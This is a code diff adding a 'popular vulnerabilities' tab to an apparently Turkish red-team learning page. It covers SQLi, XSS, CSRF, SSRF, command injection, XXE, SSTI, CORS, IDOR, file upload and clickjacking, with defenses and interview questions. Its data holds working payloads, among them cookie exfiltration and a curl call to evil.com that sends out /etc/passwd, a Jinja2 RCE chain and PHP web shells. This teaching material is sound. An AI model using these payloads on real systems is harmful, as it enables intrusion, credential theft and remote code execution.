@@ -1,6 +1,6 @@
 "use client";
 import Link from "next/link";
-import { Shield, ArrowRight, ChevronDown, ChevronRight, Crosshair, GitBranch } from "lucide-react";
+import { Shield, ArrowRight, ChevronDown, ChevronRight, Crosshair, GitBranch, Bug } from "lucide-react";
 import { useState } from "react";
 import { cn } from "@/lib/utils";
 
@@ -407,11 +407,199 @@ const levelColor: Record<string, string> = {
 // Tüm senaryoları düz listeye dök (eski kodu bozmamak için)
 const scenarios = scenarioCategories.flatMap((c) => c.scenarios);
 
+// ─── Popüler Zafiyetler ──────────────────────────────────────────────
+const vulnList = [
+  {
+    id: "sqli", title: "SQL Injection (SQLi)", emoji: "💉",
+    severity: "Kritik", sevColor: "red", category: "Web", owasp: "A03:2021",
+    desc: "Kullanıcı girdisi veritabanı sorgusuna komut olarak eklenir. Auth bypass, data dump, OS shell.",
+    howWorks: "Girdi: 1' OR '1'='1'-- -\nSorgu: SELECT * FROM users WHERE id='1' OR '1'='1'-- -\n→ Her zaman true → tüm kayıtlar döner. UNION ile başka tabloları çek, SLEEP() ile blind.",
+    payloads: [
+      { p: "' OR '1'='1'-- -", d: "Boolean bypass — auth atlatma" },
+      { p: "' UNION SELECT NULL,username,password FROM users-- -", d: "UNION data extraction" },
+      { p: "' AND SLEEP(5)-- -", d: "Time-based blind — 5 sn gecikme = zafiyet" },
+      { p: "'; EXEC xp_cmdshell('whoami')-- -", d: "MSSQL stacked + OS shell" },
+    ],
+    tool: "SQLMap", toolSlug: "sqlmap",
+    defense: "Prepared statement / parameterized query. ORM tercih et. Least privilege DB hesabı. Hata mesajlarını kullanıcıya gösterme.",
+    interview: ["SQLi türleri nelerdir? (Boolean, Time, Union, Error, Stacked)", "Prepared statement neden SQLi'yi önler?", "Blind SQLi nasıl exploit edilir?"],
+  },
+  {
+    id: "xss", title: "Cross-Site Scripting (XSS)", emoji: "🕸️",
+    severity: "Yüksek", sevColor: "orange", category: "Web", owasp: "A03:2021",
+    desc: "Saldırganın kurbanın tarayıcısında JS çalıştırması. Cookie çalma, keylogger, phishing sayfası.",
+    howWorks: "Stored: Yorum kutusuna <script>fetch('http://evil.com?c='+document.cookie)</script> yaz\nReflected: URL parametresi encode edilmeden sayfaya yansıyor\nDOM: JS, location.hash veya document.referrer'ı güvensiz işliyor",
+    payloads: [
+      { p: "<script>alert(document.domain)</script>", d: "Temel test — domain gösterir, scope doğrular" },
+      { p: "<img src=x onerror=alert(1)>", d: "Event handler — script tag filtreli ortamlar" },
+      { p: "<svg onload=alert(1)>", d: "SVG tag bypass" },
+      { p: "fetch('http://evil.com?c='+btoa(document.cookie))", d: "Cookie exfiltration — Base64 encode" },
+      { p: "\" autofocus onfocus=\"alert(1)", d: "Attribute injection — input value context" },
+    ],
+    tool: "Burp Suite", toolSlug: "burpsuite",
+    defense: "Output encoding (context'e göre HTML/JS/URL). CSP header. HttpOnly + Secure cookie flag. DOMPurify ile sanitize.",
+    interview: ["Reflected, Stored ve DOM XSS farkı nedir?", "HttpOnly flag XSS'i nasıl etkiler?", "CSP nedir, XSS'i nasıl önler?"],
+  },
+  {
+    id: "csrf", title: "Cross-Site Request Forgery (CSRF)", emoji: "🎭",
+    severity: "Yüksek", sevColor: "orange", category: "Web", owasp: "A01:2021",
+    desc: "Kurbanın tarayıcısı, kurban adına yetkisiz istek gönderir. Şifre değiştirme, para transferi, hesap ele geçirme.",
+    howWorks: "1. Kurban bank.com'a giriş yapmış (aktif session)\n2. Saldırgan evil.com'a bir link gönderir\n3. evil.com'da gizli form var: <form action='bank.com/transfer' method='POST'>...\n4. Form otomatik submit edilir, kurbanın cookie'si birlikte gider\n→ Banka sunucusu kurbanın yetkisiyle işlemi gerçekleştirir!",
+    payloads: [
+      { p: '<form action="https://TARGET/change-email" method="POST"><input name="email" value="attacker@evil.com"></form><script>document.forms[0].submit()</script>', d: "POST CSRF — email değiştirme" },
+      { p: '<img src="https://TARGET/api/logout">', d: "GET CSRF — tek satır, state değiştirir" },
+      { p: "fetch('https://TARGET/api/action',{method:'POST',credentials:'include',body:'param=val'})", d: "Fetch CSRF — credentials:include ile cookie gönder" },
+    ],
+    tool: "Burp Suite → Engagement Tools → Generate CSRF PoC", toolSlug: "burpsuite",
+    defense: "CSRF token (synchronizer token pattern). SameSite=Strict veya Lax cookie. Origin/Referer header doğrulama. Double submit cookie.",
+    interview: ["CSRF ve XSS farkı nedir?", "CSRF token neden etkilidir, nasıl bypass edilir?", "SameSite=Lax ile Strict farkı nedir?"],
+  },
+  {
+    id: "ssrf", title: "Server-Side Request Forgery (SSRF)", emoji: "🔄",
+    severity: "Kritik", sevColor: "red", category: "Web / Cloud", owasp: "A10:2021",
+    desc: "Sunucu saldırganın belirlediği URL'ye istek yapar. Internal servis erişimi, AWS metadata, credential çalma.",
+    howWorks: "Uygulama: GET /fetch?url=https://user-input.com\nSaldırgan: GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role\n→ Sunucu kendi ağından istek atar → AWS IAM credential'ları döner!",
+    payloads: [
+      { p: "http://127.0.0.1/admin", d: "Localhost — dışarıdan erişilemeyen admin panel" },
+      { p: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", d: "AWS EC2 metadata → cloud credentials" },
+      { p: "http://internal-server:8080/api/users", d: "İç ağ servisi — firewall dışarıyı blokluyor" },
+      { p: "file:///etc/passwd", d: "File scheme — yerel dosya okuma" },
+    ],
+    tool: "Burp Collaborator (OOB/blind SSRF)", toolSlug: "burpsuite",
+    defense: "Allowlist ile URL validasyonu. Private IP range'leri blokla. Cloud ortamında IMDSv2 kullan. DNS rebinding koruması.",
+    interview: ["Blind SSRF nedir, nasıl tespit edilir?", "AWS metadata SSRF zafiyeti nasıl istismar edilir?", "SSRF'i nasıl önlersin?"],
+  },
+  {
+    id: "cmd-injection", title: "Command Injection (OS Injection)", emoji: "⚡",
+    severity: "Kritik", sevColor: "red", category: "Web / Sistem", owasp: "A03:2021",
+    desc: "Kullanıcı girdisi OS komutuna eklenir. Doğrudan RCE — shell alma, dosya okuma, ağa pivot.",
+    howWorks: "Kod: system('ping -c 1 ' + userInput)\nSaldırgan: 127.0.0.1; whoami\nÇalışan: ping -c 1 127.0.0.1; whoami\n→ Noktalı virgül ikinci komutu çalıştırır!",
+    payloads: [
+      { p: "; whoami", d: "Noktalı virgül — komut zinciri (Linux)" },
+      { p: "| id", d: "Pipe — ilk komut çıktısını ikinciye ver" },
+      { p: "&& cat /etc/passwd", d: "AND — ilk başarılıysa ikinci çalışır" },
+      { p: "`whoami`", d: "Backtick — komut substitution" },
+      { p: "; curl http://evil.com/$(cat /etc/passwd|base64)", d: "Blind OOB — sonucu dışarı sızdır" },
+    ],
+    tool: "Burp Repeater + Collaborator (blind)", toolSlug: "burpsuite",
+    defense: "OS komutunu çağırma — dil kütüphanelerini kullan. Zorunluysa allowlist + escapeshellarg(). Least privilege ile çalıştır.",
+    interview: ["In-band ile blind command injection farkı?", "Neden kullanıcı girdisini OS komutuna eklemeli değil?", "escapeshellarg() yeterli mi?"],
+  },
+  {
+    id: "cookie-security", title: "Cookie Güvenliği & Session Hijacking", emoji: "🍪",
+    severity: "Yüksek", sevColor: "orange", category: "Auth / Session", owasp: "A07:2021",
+    desc: "Güvensiz cookie flag'leri veya tahmin edilebilir session ID. Cookie çalma, session fixation, replay saldırısı.",
+    howWorks: "HttpOnly eksik → XSS ile document.cookie okunur\nSecure eksik → HTTP üzerinden cookie iletilir, sniff edilir\nSameSite eksik → CSRF mümkün\nSession fixation → Saldırgan bilinen session ID'yi kurban oturumuna soktu",
+    payloads: [
+      { p: "document.cookie", d: "XSS payload — HttpOnly yoksa tüm cookie'leri okur" },
+      { p: "fetch('http://evil.com?c='+btoa(document.cookie))", d: "Cookie exfiltration — XSS + çalma zinciri" },
+      { p: "Set-Cookie: sessionid=ATTACKER_VALUE (HTTP yanıtı)", d: "Session fixation — saldırganın bildiği ID ile oturum" },
+      { p: "curl -b 'session=STOLEN_TOKEN' https://target.com/dashboard", d: "Session replay — çalınan cookie ile istek" },
+    ],
+    tool: "Burp → DevTools → Application → Cookies (flag kontrol)", toolSlug: "burpsuite",
+    defense: "HttpOnly + Secure + SameSite=Strict flag'leri. Login sonrası yeni session ID üret. Session süresi sınırla. HTTPS zorunlu kıl.",
+    interview: ["HttpOnly, Secure, SameSite flag'lerini açıkla", "Session fixation nedir, nasıl önlenir?", "Cookie güvenliğini nasıl test edersin?"],
+  },
+  {
+    id: "xxe", title: "XML External Entity (XXE)", emoji: "📄",
+    severity: "Yüksek", sevColor: "orange", category: "Web / API", owasp: "A05:2021",
+    desc: "XML parser'ın harici entity'leri işlemesi. Yerel dosya okuma, SSRF, hatta bazı parser'larda RCE.",
+    howWorks: "Normal XML: <name>Burak</name>\nXXE payload'ı harici entity tanımlar:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n<name>&xxe;</name>\n→ Parser /etc/passwd içeriğini response'a yerleştirir!",
+    payloads: [
+      { p: "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>", d: "Klasik XXE — /etc/passwd okuma" },
+      { p: "<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>", d: "SSRF via XXE — AWS metadata" },
+      { p: "<!ENTITY xxe SYSTEM 'http://BURP_COLLABORATOR/'>", d: "Blind XXE — OOB tespiti" },
+    ],
+    tool: "Burp → Content-Type: application/xml → XXE payload gönder", toolSlug: "burpsuite",
+    defense: "XML parser'da external entity'yi devre dışı bırak (FEATURE_SECURE_PROCESSING). JSON tercih et. Parser'ı güncel tut.",
+    interview: ["XXE ile hangi veriye erişilebilir?", "Blind XXE nasıl tespit edilir?", "XXE'yi nasıl önlersin?"],
+  },
+  {
+    id: "ssti", title: "Server-Side Template Injection (SSTI)", emoji: "🧩",
+    severity: "Kritik", sevColor: "red", category: "Web", owasp: "A03:2021",
+    desc: "Kullanıcı girdisi template engine'e kod olarak işlenir. Jinja2/Twig/Freemarker → RCE.",
+    howWorks: "Uygulama: render('Merhaba ' + user_input)\nNormal: 'Merhaba Burak'\nPayload: {{7*7}}\nÇıktı: 'Merhaba 49'\n→ Template engine hesapladı! Jinja2 ise OS komut yürütme mümkün.",
+    payloads: [
+      { p: "{{7*7}}", d: "Temel test — 49 dönerse Jinja2/Twig SSTI var" },
+      { p: "${7*7}", d: "Freemarker / Java EL testi" },
+      { p: "<%= 7*7 %>", d: "ERB (Ruby on Rails) testi" },
+      { p: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", d: "Jinja2 RCE — OS komut çalıştırma" },
+    ],
+    tool: "Burp Repeater + SSTImap (otomatik exploit)", toolSlug: "burpsuite",
+    defense: "Kullanıcı girdisini template'e doğrudan ekleme. Template render'a value olarak ver. Sandbox modunda çalıştır.",
+    interview: ["{{7*7}} neden SSTI testi için kullanılır?", "Hangi template engine'ler SSTI'ya açık?", "SSTI ile RCE nasıl elde edilir?"],
+  },
+  {
+    id: "cors", title: "CORS Misconfiguration", emoji: "🌍",
+    severity: "Yüksek", sevColor: "orange", category: "Web / API", owasp: "A05:2021",
+    desc: "Yanlış CORS politikası saldırgan origin'inin kimlik doğrulamalı API'ye istek yapmasına izin verir.",
+    howWorks: "Sunucu: Access-Control-Allow-Origin: https://attacker.com\n        Access-Control-Allow-Credentials: true\nSaldırgan evil.com'dan:\nfetch('https://api.target.com/user/data', {credentials:'include'})\n→ Kurbanın cookie'si ile gider, cevabı evil.com okuyabilir!",
+    payloads: [
+      { p: "Origin: https://attacker.com → ACAO: https://attacker.com + credentials:true", d: "Origin reflection + credentials → tam erişim" },
+      { p: "Origin: null", d: "Null origin bypass — bazı sunucular null kabul eder" },
+      { p: "Origin: https://target.com.evil.com", d: "Prefix bypass — zayıf regex atlatma" },
+    ],
+    tool: "Burp → Request'e Origin header ekle → response ACAO header'ını kontrol et", toolSlug: "burpsuite",
+    defense: "Allowlist ile origin doğrula. credentials:true ile wildcard (*) kullanma. Trusted origin listesini minimal tut.",
+    interview: ["CORS nedir, ne işe yarar?", "CORS ile CSRF farkı?", "credentials:true + wildcard neden tehlikeli?"],
+  },
+  {
+    id: "idor", title: "IDOR — Insecure Direct Object Reference", emoji: "🔑",
+    severity: "Yüksek", sevColor: "orange", category: "Web / API", owasp: "A01:2021",
+    desc: "Yetki kontrolü olmadan nesne ID'sinin değiştirilmesi. Başka kullanıcıların verisine erişim.",
+    howWorks: "GET /api/user/1234/profile → kendi profilim\nGET /api/user/1235/profile → başkasının profili!\n→ Sunucu authenticated mi bakar, authorized mı bakmaz.",
+    payloads: [
+      { p: "/api/user/1 → /api/user/2 → /api/user/3", d: "Sequential ID — Burp Intruder ile otomatize" },
+      { p: "/download?file=report_1234.pdf → report_1235.pdf", d: "Dosya adı IDOR — başka kullanıcı dosyası" },
+      { p: "POST /api/update {\"user_id\": 999}", d: "Body'de user_id manipülasyonu" },
+    ],
+    tool: "Burp Intruder + Autorize extension", toolSlug: "burpsuite",
+    defense: "Her istek için server-side yetki kontrolü. Dolaylı referans kullan. UUID kullan ama tek güven sayma.",
+    interview: ["IDOR ile Broken Access Control farkı?", "UUID kullanan uygulamalar IDOR'dan güvende midir?", "Autorize extension nasıl çalışır?"],
+  },
+  {
+    id: "file-upload", title: "File Upload Bypass", emoji: "📁",
+    severity: "Kritik", sevColor: "red", category: "Web", owasp: "A04:2021",
+    desc: "Dosya yükleme kısıtlamalarını atlatarak web shell yükleme. RCE — sunucuda komut çalıştırma.",
+    howWorks: "Sadece .jpg kabul ediliyor.\nSaldırgan: shell.php → shell.php.jpg (çift uzantı)\nSunucu .php kısmını yorumluyor → <?php system($_GET['cmd']); ?> çalışıyor → RCE!",
+    payloads: [
+      { p: "shell.php → shell.php.jpg", d: "Çift uzantı bypass" },
+      { p: "shell.php → shell.pHp", d: "Case bypass — blacklist büyük/küçük harf duyarsız" },
+      { p: "shell.php → shell.php5 / .phtml / .phar", d: "Alternatif PHP uzantıları" },
+      { p: "Content-Type: image/jpeg + içerik: <?php system($_GET['cmd']); ?>", d: "MIME type bypass" },
+      { p: "GIF89a;<?php system($_GET['cmd']); ?>", d: "Magic byte + payload — image validator atlatma" },
+    ],
+    tool: "Burp Repeater → Content-Type ve dosya adını değiştir", toolSlug: "burpsuite",
+    defense: "Allowlist ile uzantı kontrolü (blacklist yetersiz). Dosyayı web root dışına kaydet. Rastgele dosya adı ver. İçeriği doğrula (magic byte).",
+    interview: ["Dosya yükleme güvenliği nasıl sağlanır?", "MIME type kontrolü yeterli midir?", ".htaccess ile bypass nasıl yapılır?"],
+  },
+  {
+    id: "clickjacking", title: "Clickjacking", emoji: "👆",
+    severity: "Orta", sevColor: "amber", category: "Web / UI", owasp: "A05:2021",
+    desc: "Şeffaf iframe ile hedef site kullanıcı arayüzü üzerine bindirilir. Kurban görünmez düğmeye tıklar.",
+    howWorks: "evil.com:\n<iframe src='https://bank.com/transfer' style='opacity:0; position:absolute; top:0; left:0;'></iframe>\n<button style='position:absolute; top:X; left:Y;'>Ödülü Al!</button>\nKurban 'Ödülü Al'a tıklıyor → aslında banka transferini onaylıyor.",
+    payloads: [
+      { p: "<iframe src='https://TARGET/action' style='opacity:0.1; width:500px; height:500px;'></iframe>", d: "Temel PoC — opacity:0.1 ile hizalama test et" },
+      { p: "X-Frame-Options: DENY yoksa → iframe render edilir → zafiyet var", d: "Tespit: DevTools Network → X-Frame-Options header kontrol et" },
+    ],
+    tool: "Burp → Clickjacking PoC / manuel iframe testi", toolSlug: "burpsuite",
+    defense: "X-Frame-Options: DENY veya SAMEORIGIN. CSP: frame-ancestors 'none'. SameSite cookie bazen ek koruma sağlar.",
+    interview: ["X-Frame-Options ile CSP frame-ancestors farkı?", "Clickjacking ile CSRF farkı?", "JS frame-busting neden yeterli değil?"],
+  },
+];
+
+const sevBadge: Record<string, string> = {
+  red:    "text-red-400 bg-red-500/10 border-red-500/25",
+  orange: "text-orange-400 bg-orange-500/10 border-orange-500/25",
+  amber:  "text-amber-400 bg-amber-500/10 border-amber-500/25",
+};
+
 // ─── Bileşen ─────────────────────────────────────────────────────────
 export default function RedTeamPage() {
   const [openCats, setOpenCats] = useState<Record<string, boolean>>({});
-  const [tab, setTab] = useState<"araclar" | "senaryolar">("araclar");
+  const [tab, setTab] = useState<"araclar" | "senaryolar" | "zafiyetler">("araclar");
   const [openScenario, setOpenScenario] = useState<string | null>(null);
+  const [openVuln, setOpenVuln] = useState<string | null>(null);
 
   const toggle = (id: string) =>
     setOpenCats((s) => ({ ...s, [id]: !s[id] }));
@@ -448,6 +636,15 @@ export default function RedTeamPage() {
               : "border-transparent text-terminal-comment hover:text-terminal-white")}
         >
           <GitBranch className="w-3.5 h-3.5 inline mr-1.5" />Saldırı Senaryoları
+        </button>
+        <button
+          onClick={() => setTab("zafiyetler")}
+          className={cn("px-4 py-2 text-sm font-semibold transition-colors border-b-2 -mb-px",
+            tab === "zafiyetler"
+              ? "border-red-500 text-red-300"
+              : "border-transparent text-terminal-comment hover:text-terminal-white")}
+        >
+          <Bug className="w-3.5 h-3.5 inline mr-1.5" />Popüler Zafiyetler
         </button>
       </div>
 
@@ -510,6 +707,85 @@ export default function RedTeamPage() {
                         </div>
                       </Link>
                     ))}
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+      )}
+
+      {/* POPÜLER ZAFİYETLER */}
+      {tab === "zafiyetler" && (
+        <div className="space-y-2">
+          <p className="text-xs text-terminal-comment mb-4">
+            Mülakatların ve bug bounty'nin omurgası —{" "}
+            <span className="text-red-300">her zafiyeti teori + payload + savunma</span> üçlüsüyle öğren.
+            Tüm içerik yalnızca yetkili pentest veya izole lab <span className="text-terminal-cyan">(HTB / THM / CTF)</span> içindir.
+          </p>
+          {vulnList.map((v) => {
+            const isOpen = openVuln === v.id;
+            return (
+              <div key={v.id} className={cn("border rounded-lg overflow-hidden transition-all", isOpen ? "border-red-500/40" : "border-surface-3")}>
+                <button
+                  onClick={() => setOpenVuln(isOpen ? null : v.id)}
+                  className={cn("w-full flex items-center gap-3 px-4 py-3 text-left transition-colors", isOpen ? "bg-red-500/5" : "hover:bg-surface-2")}
+                >
+                  <span className="text-lg shrink-0">{v.emoji}</span>
+                  <div className="flex-1 min-w-0">
+                    <div className="flex items-center gap-2 flex-wrap mb-0.5">
+                      <span className="text-sm font-semibold text-terminal-white">{v.title}</span>
+                      <span className={cn("text-xs font-mono px-1.5 py-0.5 rounded border", sevBadge[v.sevColor])}>{v.severity}</span>
+                      <span className="text-xs font-mono text-terminal-comment/60 bg-surface-2 border border-surface-3 px-1.5 py-0.5 rounded">{v.owasp}</span>
+                    </div>
+                    <p className="text-xs text-terminal-comment">{v.desc}</p>
+                  </div>
+                  {isOpen ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0" /> : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0" />}
+                </button>
+
+                {isOpen && (
+                  <div className="border-t border-surface-3 divide-y divide-surface-3/50">
+                    {/* Nasıl çalışır */}
+                    <div className="p-4 space-y-1">
+                      <p className="text-xs font-semibold text-terminal-white mb-2">⚙️ Nasıl Çalışır?</p>
+                      <pre className="text-xs text-terminal-cyan font-mono bg-surface-2 rounded-md p-3 whitespace-pre-wrap leading-relaxed">{v.howWorks}</pre>
+                    </div>
+
+                    {/* Payload'lar */}
+                    <div className="p-4">
+                      <p className="text-xs font-semibold text-terminal-white mb-2">🎯 Test Payload'ları</p>
+                      <div className="space-y-2">
+                        {v.payloads.map((pl, i) => (
+                          <div key={i} className="rounded border border-surface-3 bg-surface-1 p-2.5">
+                            <code className="text-xs font-mono text-green-400 block mb-1 break-all">{pl.p}</code>
+                            <p className="text-xs text-terminal-comment">{pl.d}</p>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+
+                    {/* Araç + Savunma + Mülakat */}
+                    <div className="grid sm:grid-cols-3 divide-y sm:divide-y-0 sm:divide-x divide-surface-3/50">
+                      <div className="p-4">
+                        <p className="text-xs font-semibold text-terminal-white mb-1.5">🔧 Araç</p>
+                        <p className="text-xs text-terminal-comment mb-2">{v.tool}</p>
+                        <Link href={`/red-team/${v.toolSlug}`} className="text-xs text-red-400 hover:text-red-300 transition-colors inline-flex items-center gap-1">
+                          Araca Git <ArrowRight className="w-3 h-3" />
+                        </Link>
+                      </div>
+                      <div className="p-4">
+                        <p className="text-xs font-semibold text-terminal-white mb-1.5">🛡 Savunma</p>
+                        <p className="text-xs text-blue-300/80 leading-relaxed">{v.defense}</p>
+                      </div>
+                      <div className="p-4">
+                        <p className="text-xs font-semibold text-terminal-white mb-1.5">🎤 Mülakat Soruları</p>
+                        <ul className="space-y-1">
+                          {v.interview.map((q, i) => (
+                            <li key={i} className="text-xs text-terminal-comment before:content-['›'] before:text-red-400 before:mr-1.5">{q}</li>
+                          ))}
+                        </ul>
+                      </div>
+                    </div>
                   </div>
                 )}
               </div>
